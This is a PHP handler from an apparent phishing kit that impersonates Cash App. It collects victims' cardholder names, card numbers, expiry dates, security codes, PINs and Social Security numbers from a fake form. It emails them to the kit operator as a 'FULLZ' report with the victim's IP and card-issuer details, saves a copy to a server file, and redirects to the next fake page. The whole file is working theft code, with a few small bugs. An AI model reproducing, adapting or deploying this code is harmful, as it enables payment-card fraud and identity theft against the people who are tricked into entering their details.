<?php
 error_reporting(0);
  include ('config.php');
  include("detect.php");

function bin($ccnum) {
	$bin = preg_replace('/\s/', '', $bin);
	$bin = substr($bin,0,8);
	$url = "https://lookup.binlist.net/".$bin;
	$headersers = array();
	$headersers[] = 'Accept-Version: 3';
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headersers);
	$resp=curl_exec($ch);
	curl_close($ch);
	$result = json_decode($resp, true);
	return $result;
}
$ip = $_SERVER['REMOTE_ADDR'];
$InfoDATE   = date("d-m-Y h:i:sa");
$yahya_email .= '<html><head></head>
<body>
<style>
font {font-family: "Comic Sans MS", cursive, sans-serif;},
</style>
<div style="font-size: 13px;font-family:monospace;font-weight:700;">
[<font style="color: #0070ba;">FULLZ CA💲HAPP</font>]
<br>
<font style="color:#9c0000;"></font> [NAME ON CARD] = <font >'.$_POST['CCname'].'</font>
<br>
<font style="color:#9c0000;"></font> [CARD NUMBER] = <font >'.$_POST['CCinfo'].'</font>
<br>
<font style="color:#9c0000;"></font> [EXP DATE] = <font >'.$_POST['EXPdate'].'</font>
<br>
<font style="color:#9c0000;"></font> [CSC] = <font >'.$_POST['CVV'].'</font>
<br>
<font style="color:#9c0000;"></font> [ATM PIN] = <font >'.$_POST['ZipCode'].'</font>
<br>
<font style="color:#9c0000;"></font> [SSN] = <font >'.$_POST['ZZN'].'</font>
<br>
<font>[System]</font> <br>
<font style="color:#9c0000;"></font> [IP INFO] = <font>
<a target="_blank" style="text-decoration:none;" href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'"> '.$_SERVER['REMOTE_ADDR'].' </a></font><br>
<font style="color:#9c0000;"></font> [TIME/DATE] = <font >'.$InfoDATE.'</font><br>
[<font style="color: #FF0000;">THANKS TO KEVIN</font>]
 <font style="color: #820000;"></font></div><font>
</font>
</body></html>';
$bin = bin($_POST['CCinfo']);
$bins = preg_replace('/\s/', '', $_POST['CCinfo']);
$bins = substr($bins,0,6);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "✅ FULLZ CA💲HAPP [".$bin."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." [".$_SERVER['REMOTE_ADDR']." | ".$_SESSION['country1']." ] 💘 "; 
$headers .= "From: CA💲HAPP™" . "\r\n";
mail($send,$subject,$yahya_email,$headers);

	$save=fopen("../stored.php","a+");
	fwrite($save,$yahya_email);
	fclose($save);

 header("location: ../card2.php"); 

	 
?>